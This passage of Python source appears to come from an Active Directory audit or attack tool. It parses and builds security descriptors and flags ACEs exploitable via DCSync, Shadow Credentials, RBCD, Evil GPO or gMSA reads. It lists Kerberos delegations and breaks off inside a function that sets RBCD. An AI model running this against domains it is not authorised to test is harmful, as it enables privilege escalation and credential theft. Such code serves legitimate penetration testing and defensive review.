										# This flag is used to hold the security information specified by a caller until the security descriptor is associated with a securable object. After the security descriptor is associated with a securable object, the SE_DACL_PRESENT flag is always set in the security descriptor control.
										# To set this flag, use the SetSecurityDescriptorDacl function.
	SE_DACL_PROTECTED = 0x1000			# Prevents the DACL of the security descriptor from being modified by inheritable ACEs. To set this flag, use the SetSecurityDescriptorControl function.
	SE_GROUP_DEFAULTED = 0x0002			# Indicates that the security identifier (SID) of the security descriptor group was provided by a default mechanism. This flag can be used by a resource manager to identify objects whose security descriptor group was set by a default mechanism. To set this flag, use the SetSecurityDescriptorGroup function.
	SE_OWNER_DEFAULTED = 0x0001			# Indicates that the SID of the owner of the security descriptor was provided by a default mechanism. This flag can be used by a resource manager to identify objects whose owner was set by a default mechanism. To set this flag, use the SetSecurityDescriptorOwner function.
	SE_RM_CONTROL_VALID = 0x4000		# Indicates that the resource manager control is valid.
	SE_SACL_AUTO_INHERIT_REQ = 0x0200	# Indicates a required security descriptor in which the system access control list (SACL) is set up to support automatic propagation of inheritable ACEs to existing child objects.
										# The system sets this bit when it performs the automatic inheritance algorithm for the object and its existing child objects. To convert a security descriptor and set this flag, protected servers can call the ConvertToAutoInheritPrivateObjectSecurity function.
	SE_SACL_AUTO_INHERITED = 0x0800		# Indicates a security descriptor in which the system access control list (SACL) is set up to support automatic propagation of inheritable ACEs to existing child objects.
										# The system sets this bit when it performs the automatic inheritance algorithm for the object and its existing child objects. To convert a security descriptor and set this flag, protected servers can call the ConvertToAutoInheritPrivateObjectSecurity function.
	SE_SACL_DEFAULTED = 0x0008			# A default mechanism, rather than the original provider of the security descriptor, provided the SACL. This flag can affect how the system treats the SACL, with respect to ACE inheritance. The system ignores this flag if the SE_SACL_PRESENT flag is not set. To set this flag, use the SetSecurityDescriptorSacl function.
	SE_SACL_PRESENT   = 0x0010			# Indicates a security descriptor that has a SACL. To set this flag, use the SetSecurityDescriptorSacl function.
	SE_SACL_PROTECTED = 0x2000			# Prevents the SACL of the security descriptor from being modified by inheritable ACEs. To set this flag, use the SetSecurityDescriptorControl function.
	SE_SELF_RELATIVE  = 0x8000			# Indicates a self-relative security descriptor. If this flag is not set, the security descriptor is in absolute format. For more information, see Absolute and Self-Relative Security Descriptors.

SDDL_ACL_CONTROL_FLAGS = {
	"P"  : SE_SACL.SE_DACL_PROTECTED,
	"AR" : SE_SACL.SE_DACL_AUTO_INHERIT_REQ,
	"AI" : SE_SACL.SE_DACL_AUTO_INHERITED,
	"SR" : SE_SACL.SE_SELF_RELATIVE,
	# "NO_ACCESS_CONTROL" : 0
}

SDDL_ACL_CONTROL_FLAGS_INV = {v: k for k, v in SDDL_ACL_CONTROL_FLAGS.items()}

def SDDL_ACL_CONTROL(flags):
	t = ''
	for x in SDDL_ACL_CONTROL_FLAGS_INV:
		if x == SE_SACL.SE_SELF_RELATIVE:
			continue # This flag is always set implicitly
		if x in flags:
			t += SDDL_ACL_CONTROL_FLAGS_INV[x]
	return t

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7d4dac05-9cef-4563-a058-f108abecce1d
class SECURITY_DESCRIPTOR:
	def __init__(self, object_type = None):
		self.Revision = 1
		self.Sbz1 = 0 # Default value but SDDL doesnt store this info and in some cases this field is nonzero
		self.Control = None
		self.Owner = None
		self.Group = None
		self.Sacl = None
		self.Dacl = None

		self.object_type = object_type # High level info, not part of the struct

	@staticmethod
	def from_bytes(data, object_type = None):
		return SECURITY_DESCRIPTOR.from_buffer(io.BytesIO(data), object_type)

	def to_bytes(self):
		buff = io.BytesIO()
		self.to_buffer(buff)
		buff.seek(0)
		return buff.read()

	def to_buffer(self, buff):
		start = buff.tell()
		buff_data = io.BytesIO()
		OffsetOwner = 0
		OffsetGroup = 0
		OffsetSacl = 0
		OffsetDacl = 0

		if self.Owner is not None:
			buff_data.write(self.Owner.to_bytes())
			OffsetOwner = start + 20

		if self.Group is not None:
			OffsetGroup = start + 20 + buff_data.tell()
			buff_data.write(self.Group.to_bytes())

		if self.Sacl is not None:
			OffsetSacl = start + 20 + buff_data.tell()
			buff_data.write(self.Sacl.to_bytes())

		if self.Dacl is not None:
			OffsetDacl = start + 20 + buff_data.tell()
			buff_data.write(self.Dacl.to_bytes())

		buff.write(self.Revision.to_bytes(1, 'little', signed = False))
		buff.write(self.Sbz1.to_bytes(1, 'little', signed = False))
		buff.write(self.Control.to_bytes(2, 'little', signed = False))
		buff.write(OffsetOwner.to_bytes(4, 'little', signed = False))
		buff.write(OffsetGroup.to_bytes(4, 'little', signed = False))
		buff.write(OffsetSacl.to_bytes(4, 'little', signed = False))
		buff.write(OffsetDacl.to_bytes(4, 'little', signed = False))
		buff_data.seek(0)
		buff.write(buff_data.read())

	@staticmethod
	def from_buffer(buff, object_type = None):
		sd = SECURITY_DESCRIPTOR(object_type)
		sd.Revision = int.from_bytes(buff.read(1), 'little', signed = False)
		sd.Sbz1 =  int.from_bytes(buff.read(1), 'little', signed = False)
		sd.Control = SE_SACL(int.from_bytes(buff.read(2), 'little', signed = False))
		OffsetOwner  = int.from_bytes(buff.read(4), 'little', signed = False)
		OffsetGroup  = int.from_bytes(buff.read(4), 'little', signed = False)
		OffsetSacl  = int.from_bytes(buff.read(4), 'little', signed = False)
		OffsetDacl  = int.from_bytes(buff.read(4), 'little', signed = False)

		if OffsetOwner > 0:
			buff.seek(OffsetOwner)
			sd.Owner = SID.from_buffer(buff)

		if OffsetGroup > 0:
			buff.seek(OffsetGroup)
			sd.Group = SID.from_buffer(buff)

		if OffsetSacl > 0:
			buff.seek(OffsetSacl)
			sd.Sacl = ACL.from_buffer(buff, object_type)

		if OffsetDacl > 0:
			buff.seek(OffsetDacl)
			sd.Dacl = ACL.from_buffer(buff, object_type)

		return sd

	def to_sddl(self, ace_rights_adcs = False, object_type = None):
		t = ''
		if self.Owner is not None:
			t += 'O:' + self.Owner.to_sddl()
		if self.Group is not None:
			t += 'G:' + self.Group.to_sddl()
		if self.Sacl is not None:
			t += 'S:' + SDDL_ACL_CONTROL(self.Control) + self.Sacl.to_sddl(object_type)
		if self.Dacl is not None:
			t += 'D:' + SDDL_ACL_CONTROL(self.Control) + self.Dacl.to_sddl(ace_rights_adcs, object_type)
		return t

	@staticmethod
	def from_sddl(sddl:str, ace_rights_adcs = False, object_type = None, domain_sid = None):
		sd = SECURITY_DESCRIPTOR(object_type = object_type)
		params = sddl.split(':')
		np = [params[0]]
		i = 1
		while i < len(params):
			np.append(params[i][:-1])
			np.append(params[i][-1])
			i += 1
		params = {}
		i = 0
		while i < len(np):
			if np[i] == ')':
				break
			params[np[i]] = np[i+1]
			i += 2

		sd.Control = SE_SACL.SE_SELF_RELATIVE
		fk = None
		if 'D' in params:
			fk = 'D'
		elif 'S' in params:
			fk = 'S'

		if fk is not None:
			if '(' in params[fk]:
				flags, acl = params[fk].split('(', 1)
			else:
				flags = params[fk]
			if flags.upper().find('P') != -1:
				sd.Control |= SE_SACL.SE_DACL_PROTECTED
				sd.Control |= SE_SACL.SE_SACL_PROTECTED
				flags = flags.replace('P', '')
			for _ in range(len(flags)):
				x = flags[:2]
				cf = SDDL_ACL_CONTROL_FLAGS[x]
				if cf == SE_SACL.SE_DACL_AUTO_INHERIT_REQ:
					sd.Control |= SE_SACL.SE_DACL_AUTO_INHERIT_REQ
					sd.Control |= SE_SACL.SE_SACL_AUTO_INHERIT_REQ
				elif cf == SE_SACL.SE_DACL_AUTO_INHERITED:
					sd.Control |= SE_SACL.SE_DACL_AUTO_INHERITED
					sd.Control |= SE_SACL.SE_SACL_AUTO_INHERITED
				else:
					sd.Control |= cf

				flags = flags[2:]
				if flags == '':
					break

		if 'O' in params:
			sd.Owner = SID.from_sddl(params['O'], domain_sid = domain_sid)
		if 'G' in params:
			sd.Group = SID.from_sddl(params['G'], domain_sid = domain_sid)
		if 'D' in params:
			sd.Control |= SE_SACL.SE_DACL_PRESENT
			acl = params['D']
			m = acl.find('(')
			if m != -1:
				sd.Dacl = ACL.from_sddl(acl[m:], ace_rights_adcs = ace_rights_adcs, object_type = object_type, domain_sid = domain_sid)
		if 'S' in params:
			sd.Control |= SE_SACL.SE_SACL_PRESENT
			acl = params['S']
			m = acl.find('(')
			if m != -1:
				sd.Sacl = ACL.from_sddl(acl[m:], object_type = object_type, domain_sid = domain_sid)

		return sd

# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/932a7a8d-8c93-4448-8093-c79b7d9ba499
class SD_FLAGS_CONTROL():
	OWNER_SECURITY_INFORMATION = 1 # Query SD Owner through LDAP_SERVER_SD_FLAGS_OID operation
	GROUP_SECURITY_INFORMATION = 2 # Query SD Group through LDAP_SERVER_SD_FLAGS_OID operation
	DACL_SECURITY_INFORMATION  = 4 # Query SD DACL through LDAP_SERVER_SD_FLAGS_OID operation
	SACL_SECURITY_INFORMATION  = 8 # Query SD SACL through LDAP_SERVER_SD_FLAGS_OID operation

SD_FLAGS_CONTROL_MAP = {
	"OWNER_SECURITY_INFORMATION": SD_FLAGS_CONTROL.OWNER_SECURITY_INFORMATION,
	"GROUP_SECURITY_INFORMATION": SD_FLAGS_CONTROL.GROUP_SECURITY_INFORMATION,
	"DACL_SECURITY_INFORMATION": SD_FLAGS_CONTROL.DACL_SECURITY_INFORMATION,
	"SACL_SECURITY_INFORMATION": SD_FLAGS_CONTROL.SACL_SECURITY_INFORMATION
}

###########################################################################################
#                     Security Descriptor Definition Language (SDDL)                      #
###########################################################################################

def isVulnerableACE(type, mask, object_guid, isGMSA, objectClass):
	
	# ACEs with known exploits
	# Does not check for denied access

	haveExploit = False
	havePartialExploit = False
	objectGUIDs = []
	exploits = []
	
	if (type == "ACCESS_ALLOWED_OBJECT_ACE_TYPE" or type == "ACCESS_ALLOWED_ACE_TYPE"):
		# GENERIC_ALL on * -> Anything below
		# WRITE_DACL on * -> Grant any rights
		#	On OU/Container/Domain
		# 		-> If ACE write with inheritance flag -> Child objects into the OU/Container/Domain will inherit the ACE (except if protected object = adminCount=1)
		# WRITE_OWNER on * -> Grant ownership -> WRITE_DACL
		if ('GENERIC_ALL' in mask or 'WRITE_DACL' in mask or 'WRITE_OWNER' in mask):
			if b"user" in objectClass:
				haveExploit = True
				exploits += ['UserAccountControl', 'ShadowCredentials', 'LogonScript', 'TargetedKerberoasting', 'ResetPwd', 'RBCD-SPNLess']
			if b"computer" in objectClass:
				haveExploit = True
				exploits += ['UserAccountControl', 'RBCD', 'SPNJacking', 'ShadowCredentials', 'ReadLAPS']
			if b"group" in objectClass:
				haveExploit = True
				exploits += ['AddMember']
			if b"domain" in objectClass:
				haveExploit = True
				exploits += ['DCSync', 'ReadLAPSAllComputers']
			if b"organizationalUnit" in objectClass or b"container" in objectClass or b"domain" in objectClass: # Require child objects to not have adminCount=1
				haveExploit = True
				exploits += ['ACEInheritance']
			if b"groupPolicyContainer" in objectClass:
				haveExploit = True
				exploits += ['EvilGPO'] # Require also SMB write access to the GPO
			if isGMSA:
				haveExploit = True
				exploits += ['ReadGMSA']

		# GENERIC_WRITE/WRITE_PROPERTY on User -> UserAccountControl/RBCD SPN-less User/Shadow Credentials/Logon script/Targeted Kerberoasting
		# 	With respective object_guid for WRITE_PROPERTY = User-Account-Control/msDS-AllowedToActOnBehalfOfOtherIdentity/msDS-KeyCredentialLink/Script-Path/ServicePrincipalName 
		if ('GENERIC_WRITE' in mask and b"user" in objectClass):
			haveExploit = True
			exploits += ['UserAccountControl', 'ShadowCredentials', 'LogonScript', 'TargetedKerberoasting', 'ResetPwd', 'RBCD-SPNLess']
		if ('WRITE_PROPERTY' in mask and b"user" in objectClass):
			if object_guid == 'User-Account-Control':
				haveExploit = True
				exploits += ['UserAccountControl']
			if object_guid == 'msDS-AllowedToActOnBehalfOfOtherIdentity':
				haveExploit = True
				exploits += ['RBCD-SPNLess']
			elif object_guid == 'msDS-KeyCredentialLink':
				haveExploit = True
				exploits += ['ShadowCredentials']
			elif object_guid == 'Script-Path':
				haveExploit = True
				exploits += ['LogonScript']
			elif object_guid == 'ServicePrincipalName':
				haveExploit = True
				exploits += ['TargetedKerberoasting']

		# GENERIC_WRITE/WRITE_PROPERTY on Computer -> UserAccountControl/RBCD/SPN Jacking/Shadow Credentials
		#	With respective object_guid for WRITE_PROPERTY = User-Account-Control/msDS-AllowedToActOnBehalfOfOtherIdentity/ServicePrincipalName/msDS-KeyCredentialLink
		if ('GENERIC_WRITE' in mask and b"computer" in objectClass):
			haveExploit = True
			exploits += ['RBCD', 'SPNJacking', 'ShadowCredentials', 'ReadLAPS']
		if ('WRITE_PROPERTY' in mask and b"computer" in objectClass):
			if object_guid == 'User-Account-Control':
				haveExploit = True
				exploits += ['UserAccountControl']
			if object_guid == 'msDS-AllowedToActOnBehalfOfOtherIdentity':
				haveExploit = True
				exploits += ['RBCD']
			elif object_guid == 'ServicePrincipalName':
				haveExploit = True
				exploits += ['SPNJacking']
			elif object_guid == 'msDS-KeyCredentialLink':
				haveExploit = True
				exploits += ['ShadowCredentials']

		# GENERIC_WRITE/WRITE_PROPERTY on OU/Container/Domain -> gPLink (Point to a rogue LDAP server that handle a GPC object that point to a rogue SMB server with a malicious immediate task)
		#	With respective object_guid for WRITE_PROPERTY = GP-Link
		if ('GENERIC_WRITE' in mask and (b"organizationalUnit" in objectClass or b"container" in objectClass or b"domain" in objectClass)):
			haveExploit = True
			exploits += ['gPLink']
		if ('WRITE_PROPERTY' in mask and (b"organizationalUnit" in objectClass or b"container" in objectClass or b"domain" in objectClass)):
			if object_guid == "GP-Link":
				haveExploit = True
				exploits += ['gPLink']

		# GENERIC_WRITE/WRITE_PROPERTY on GPO -> Evil GPO with Immediate Task with SMB write access/Evil GPO with Immediate Task and rogue SMB
		#	With respective object_guid for WRITE_PROPERTY = Version-Number AND (GPC-User-Extension-Names for Machine GPO OR GPC-User-Extension-Names for User GPO)/Version-Number AND (GPC-User-Extension-Names for Machine GPO OR GPC-User-Extension-Names for User GPO) AND GPC-File-Sys-Path
		if ('GENERIC_WRITE' in mask and b"groupPolicyContainer" in objectClass): # Require also SMB write access to the GPO
			haveExploit = True
			exploits += ['EvilGPO']
		if ('WRITE_PROPERTY' in mask and b"groupPolicyContainer" in objectClass):
			if object_guid == 'GPC-File-Sys-Path' or object_guid == 'Version-Number' or object_guid == 'GPC-User-Extension-Names' or object_guid == 'GPC-User-Extension-Names': # Partial check
				havePartialExploit = True
				objectGUIDs += [object_guid]

		# GENERIC_WRITE/WRITE_PROPERTY/SELF on Group -> Add member
		#	With respective object_guid for WRITE_PROPERTY = Member
		#	With respective object_guid for SELF = Self-Membership
		if ('GENERIC_WRITE' in mask and b"group" in objectClass):
			haveExploit = True
			exploits += ['AddMember']
		if ('WRITE_PROPERTY' in mask and b"group" in objectClass):
			if object_guid == 'Member':
				haveExploit = True
				exploits += ['AddMember']
		if ('SELF' in mask and b"group" in objectClass):
			if object_guid == 'Self-Membership':
				haveExploit = True
				exploits += ['AddMember']

		# EXTENDED_RIGHTS and object_guid = <None> on Group -> Add member
		if ('EXTENDED_RIGHTS' in mask and b"group" in objectClass and object_guid == "<None>"):
			haveExploit = True
			exploits += ['AddMember']

		# EXTENDED_RIGHTS and object_guid = <None> OR User-Force-Change-Password on User -> Reset pwd
		if ('EXTENDED_RIGHTS' in mask and b"user" in objectClass and (object_guid == "<None>" or object_guid == "User-Force-Change-Password")):
			haveExploit = True
			exploits += ['ResetPwd']

		# EXTENDED_RIGHTS and object_guid = <None> on Computer -> Read LAPS
		if ('EXTENDED_RIGHTS' in mask and b"computer" in objectClass and object_guid == "<None>"):
			haveExploit = True
			exploits += ['ReadLAPS']

		# EXTENDED_RIGHTS and object_guid = <None> OR (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All) on Domain -> DCSync
		if ('EXTENDED_RIGHTS' in mask and b"domain" in objectClass):
			if object_guid == "<None>":
				haveExploit = True
				exploits += ['DCSync']
			elif object_guid == "DS-Replication-Get-Changes" or object_guid == "DS-Replication-Get-Changes-All": # Partial check
				havePartialExploit = True
				objectGUIDs += [object_guid]

		# EXTENDED_RIGHTS and object_guid = <None> OR (DS-Replication-Get-Changes + (DS-Replication-Get-Changes-All or DS-Replication-Get-Changes-In-Filtered-Set)) on Domain -> Read LAPS for all computers
		if ('EXTENDED_RIGHTS' in mask and b"domain" in objectClass):
			if object_guid == "<None>":
				haveExploit = True
				exploits += ['ReadLAPSAllComputers']
			elif object_guid == "DS-Replication-Get-Changes" or object_guid == "DS-Replication-Get-Changes-All" or object_guid == "DS-Replication-Get-Changes-In-Filtered-Set": # Partial check
				havePartialExploit = True
				objectGUIDs += [object_guid]

		# GENERIC_ALL in Security Descriptor of msDS-GroupMSAMembership attribute of gMSA account -> Read GMSA password
		if ('GENERIC_ALL' in mask and isGMSA):
			haveExploit = True
			exploits += ['ReadGMSA']

	return (haveExploit, havePartialExploit, list(set(exploits)), objectGUIDs)

def parseDACL(conn, server, sd, ace_rights_adcs = False, dn = None, sids_filter = None, indent = 0, searchVulnerable = False, isGMSA = False, objectClass = []):
	firstIndent = '\t' * indent
	nextIndent = '\t' * (indent+1)

	# Sometimes the SDDL is defined but contain no ACE
	# For example for msDS-AllowedToActOnBehalfOfOtherIdentity
	if (sd.Dacl.AceCount != 0):
		# Get DACL
		dacl = sd.Dacl.to_sddl(ace_rights_adcs)
		dacl = dacl[dacl.find("(")+1:-1]

		haveExploit = False
		previousObjectGUIDsForSIDs = {}
		allExploits = []

		if searchVulnerable:
			print(f"{firstIndent}[+] Searching vulnerable ACEs on '{dn}'")

		# For each ACE
		for ace in dacl.split(")("):
			# https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings
			# ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
			ace_type, ace_flags, rights, object_guid, inherit_object_guid, account_sid = ace.split(";")

			# Type parsing
			type = SDDL_TO_ACE_TYPE_STR(ace_type)

			# Flags parsing
			flags = SDDL_TO_ACE_FLAGS_STR(ace_flags)

			# Rights parsing
			mask = SDDL_TO_ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_STR(rights) if ace_rights_adcs else SDDL_TO_ACE_ACCESS_RIGHTS_STR(rights)

			# Object_GUID parsing
			object_guid = SDDL_TO_ACE_OBJECT_GUID_STR(conn, server, object_guid)

			# Inherit_Object_GUID parsing
			inherit_object_guid = SDDL_TO_ACE_OBJECT_GUID_STR(conn, server, inherit_object_guid)

			if (sids_filter != None):
				for sid in sids_filter.keys():
					# Is the trustee we search for ?
					if (account_sid == sid):
						sam = None
						if conn != None:
							sam = SIDsToSAMs(conn, server, [account_sid])
						if sam != {}:
							sam = sam[account_sid]
						else:
							sam = account_sid
						if searchVulnerable:
							if sid not in previousObjectGUIDsForSIDs.keys():
								previousObjectGUIDsForSIDs[sid] = [sam]
							vulnerable, partiallyVulnerable, exploits, previousObjectGUIDs = isVulnerableACE(type, mask, object_guid, isGMSA, objectClass)
							if vulnerable or partiallyVulnerable:
								if vulnerable:
									haveExploit = True
									allExploits += exploits
								previousObjectGUIDsForSIDs[sid] += previousObjectGUIDs
								print(f"{nextIndent}[+] Found ACE")
								print(f"{nextIndent}\t[+] ACE Type = {type}\n{nextIndent}\t[+] ACE Flags = {flags}\n{nextIndent}\t[+] ACE Rights = {mask}\n{nextIndent}\t[+] ACE Object = {object_guid}\n{nextIndent}\t[+] ACE Inherit Object = {inherit_object_guid}\n{nextIndent}\t[+] ACE Trustee = {sam}")
						else:
							print(f"{firstIndent}[+] Found ACE that apply to '{dn}'")
							print(f"{nextIndent}[+] ACE Type = {type}\n{nextIndent}[+] ACE Flags = {flags}\n{nextIndent}[+] ACE Rights = {mask}\n{nextIndent}[+] ACE Object = {object_guid}\n{nextIndent}[+] ACE Inherit Object = {inherit_object_guid}\n{nextIndent}[+] ACE Trustee = {sam}")
			else:
				sam = None
				if conn != None:
					sam = SIDsToSAMs(conn, server, [account_sid])
				if sam != {}:
					sam = sam[account_sid]
				else:
					sam = account_sid
				print(f"{firstIndent}[+] Found ACE")
				print(f"{nextIndent}[+] ACE Type = {type}\n{nextIndent}[+] ACE Flags = {flags}\n{nextIndent}[+] ACE Rights = {mask}\n{nextIndent}[+] ACE Object = {object_guid}\n{nextIndent}[+] ACE Inherit Object = {inherit_object_guid}\n{nextIndent}[+] ACE Trustee = {sam}")
	
		# We have iterate over each ACEs: Check for objectGUIDs combination for potential vulnerabilities
		if searchVulnerable:

			for sid in previousObjectGUIDsForSIDs.keys():
				previousObjectGUIDs = previousObjectGUIDsForSIDs[sid]

				if len(previousObjectGUIDs) > 1:
					sam = previousObjectGUIDs[0]

					# GENERIC_WRITE/WRITE_PROPERTY on GPO -> Evil GPO with Immediate Task with SMB write access/Evil GPO with Immediate Task and rogue SMB
					#	With respective object_guid for WRITE_PROPERTY = Version-Number AND (GPC-User-Extension-Names for Machine GPO OR GPC-User-Extension-Names for User GPO)/Version-Number AND (GPC-User-Extension-Names for Machine GPO OR GPC-User-Extension-Names for User GPO) AND GPC-File-Sys-Path
					if 'Version-Number' in previousObjectGUIDs and ('GPC-User-Extension-Names' in previousObjectGUIDs or 'GPC-User-Extension-Names' in previousObjectGUIDs):
						haveExploit = True
						allExploits +=  ['EvilGPO']
						if 'GPC-File-Sys-Path' in previousObjectGUIDs:
							allExploits += ['gPCFileSysPath']

					# EXTENDED_RIGHTS and object_guid = <None> OR (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All) on Domain -> DCSync
					if "DS-Replication-Get-Changes" in previousObjectGUIDs and "DS-Replication-Get-Changes-All" in previousObjectGUIDs:
						haveExploit = True
						allExploits += ['DCSync']

					# EXTENDED_RIGHTS and object_guid = <None> OR (DS-Replication-Get-Changes + (DS-Replication-Get-Changes-All or DS-Replication-Get-Changes-In-Filtered-Set)) on Domain -> Read LAPS for all computers
					if "DS-Replication-Get-Changes" in previousObjectGUIDs and ("DS-Replication-Get-Changes-All" in previousObjectGUIDs or "DS-Replication-Get-Changes-In-Filtered-Set" in previousObjectGUIDs):
						haveExploit = True
						allExploits += ['ReadLAPSAllComputers']
					
			if haveExploit:
				print(f"{nextIndent}[+] Found exploit(s) for '{sam}' = {list(set(allExploits))}")
	else:
		print(f"{firstIndent}[-] No ACEs into DACLs", file = sys.stderr)

#################################################################
#                     nTSecurityDescriptor                      #
#################################################################

def buildNTSecurityDescriptor(sddlStr, ace_rights_adcs = False):
	print_yellow("[*] Building nTSecurityDescriptor")
	print_yellow("---")
	print()

	try:
		# Binary format from SDDL format (https://github.com/skelsec/winacl)
		sd = SECURITY_DESCRIPTOR.from_sddl(sddlStr, ace_rights_adcs)
		sdBytes = sd.to_bytes()
		sdB64 = base64.b64encode(sdBytes)

		print(f"[+] nTSecurityDescriptor = {sdB64.decode()}")

		return sdB64.decode()
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def parseNTSecurityDescriptor(conn, server, sdData, ace_rights_adcs = False):
	print_yellow("[*] Parsing nTSecurityDescriptor")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available. Resolving ACE Object/Inherit Object may failed", file = sys.stderr)

		# Binary format to SDDL format (https://github.com/skelsec/winacl)
		sd = SECURITY_DESCRIPTOR.from_bytes(sdData)
		sddl = sd.to_sddl(ace_rights_adcs)

		print(f"[+] SDDL = {sddl}")

		parseDACL(conn, server, sd, ace_rights_adcs)

		return sddl
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##################################################################################
#                     Kerberos Delegations (KUD, KCD, RBCD)                      #
##################################################################################

def listKerbDeleg(conn, server, objects):
	print_yellow("[*] Listing Kerberos Delegations (KUD, KCD, RBCD) allowed for provided AD objects")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		sids = getSIDs(conn, server, objects)
		dns = getDNs(conn, server, objects)

		if len(sids) == 0 or len(dns) == 0:
			print("[-] Provided AD object(s) not found", file = sys.stderr)
			return

		print("[+] Current mapping")
		for key, val in sids.items():
			print(f"\t[+] {key}: {val}")

		nbentries = 0

		# KUD
		for dn in dns:
			escaped_object = escape_filter_chars(dn)
			entry_generator = search(conn, server, escaped_object, f"(distinguishedName={escaped_object})", attributes = ["userAccountControl"])
			for entry in entry_generator:
				if entry["type"] == "searchResEntry":
					uacVal = int(entry["raw_attributes"]["userAccountControl"][0])
					if USER_ACCOUNT_CONTROL_MASK["TRUSTED_FOR_DELEGATION"] & uacVal:
						nbentries += 1
						print(f"[+] '{dn}' have KUD enabled")

		# KCD
		for dn in dns:
			escaped_object = escape_filter_chars(dn)
			entry_generator = search(conn, server, escaped_object, f"(distinguishedName={escaped_object})", attributes = ["userAccountControl", "msDS-AllowedToDelegateTo"])
			for entry in entry_generator:
				if entry["type"] == "searchResEntry":
					kcd = entry["raw_attributes"]["msDS-AllowedToDelegateTo"]
					if kcd != []:
						nbentries += 1
						kcd = kcd[0].decode()
						print("[+] '{}' have KCD to '{}'".format(dn, kcd))
						uacVal = int(entry["raw_attributes"]["userAccountControl"][0])
						if USER_ACCOUNT_CONTROL_MASK["TRUSTED_TO_AUTH_FOR_DELEGATION"] & uacVal:
							print("\t[+] KCD for '{}' is configured with Protocol Transition".format(dn))
						else:
							print("\t[+] KCD for '{}' is configured without Protocol Transition".format(dn))

		# RBCD
		entry_generator = search(conn, server, attributes = ["distinguishedName", "userAccountControl", "msDS-AllowedToActOnBehalfOfOtherIdentity"])
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				allowedToActOnBehalfOfOtherIdentity = entry["raw_attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"]
				if allowedToActOnBehalfOfOtherIdentity != []:
					allowedToActOnBehalfOfOtherIdentity = allowedToActOnBehalfOfOtherIdentity[0]
					dn = entry["raw_attributes"]["distinguishedName"][0].decode()
					sd = SECURITY_DESCRIPTOR.from_bytes(allowedToActOnBehalfOfOtherIdentity)
					if (sd.Dacl.AceCount != 0):
						dacl = sd.Dacl.to_sddl()
						dacl = dacl[dacl.find("(")+1:-1]
						for ace in dacl.split(")("):
							ace_type, ace_flags, rights, object_guid, inherit_object_guid, account_sid = ace.split(";")
							type = SDDL_TO_ACE_TYPE_STR(ace_type)
							flags = SDDL_TO_ACE_FLAGS_STR(ace_flags)
							mask = SDDL_TO_ACE_ACCESS_RIGHTS_STR(rights)
							object_guid = SDDL_TO_ACE_OBJECT_GUID_STR(conn, server, object_guid)
							inherit_object_guid = SDDL_TO_ACE_OBJECT_GUID_STR(conn, server, inherit_object_guid)
							# Is the trustee we search for ?
							if (account_sid in sids.keys()):
								nbentries += 1
								print("[+] '{}' have RBCD enabled for '{}'".format(dn, sids[account_sid]))
								print(f"\t[+] ACE Type = {type}\n\t[+] ACE Flags = {flags}\n\t[+] ACE Rights = {mask}\n\t[+] ACE Object = {object_guid}\n\t[+] ACE Inherit Object = {inherit_object_guid}\n\t[+] ACE Trustee SID = {sids[account_sid]}")
	
		if nbentries == 0:
			print("[-] KUD/KCD/RBCD not configured for provided objects", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def parseAllowedToActOnBehalfOfOtherIdentity(conn, server, sdB64):
	print_yellow("[*] Parsing msDS-AllowedToActOnBehalfOfOtherIdentity")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		# Base64 Decode
		sdData = base64.b64decode(sdB64) # Base64 Decode

		# Binary format to SDDL format (https://github.com/skelsec/winacl)
		sd = SECURITY_DESCRIPTOR.from_bytes(sdData)
		sddl = sd.to_sddl()
		print(f"[+] SDDL = {sddl}")

		parseDACL(conn, server, sd)

		return sddl
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def buildAllowedToActOnBehalfOfOtherIdentity(sddlStr):
	print_yellow("[*] Building msDS-AllowedToActOnBehalfOfOtherIdentity")
	print_yellow("---")
	print()

	try:
		# Binary format from SDDL format (https://github.com/skelsec/winacl)
		sd = SECURITY_DESCRIPTOR.from_sddl(sddlStr)
		sdBytes = sd.to_bytes()
		sdB64 = base64.b64encode(sdBytes)

		print(f"[+] msDS-AllowedToActOnBehalfOfOtherIdentity = {sdB64.decode()}")

		return sdB64.decode()
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def setRBCD(conn, server, object1, object2):
	print_yellow("[*] Set msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD) attribute")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		sids = getSIDs(conn, server, [object1])
		dns = getDNs(conn, server, [object2])

		if len(sids) == 0 or len(dns) == 0:
			print("[-] Provided AD object(s) not found", file = sys.stderr)
			return

		sid = list(sids.keys())[0]
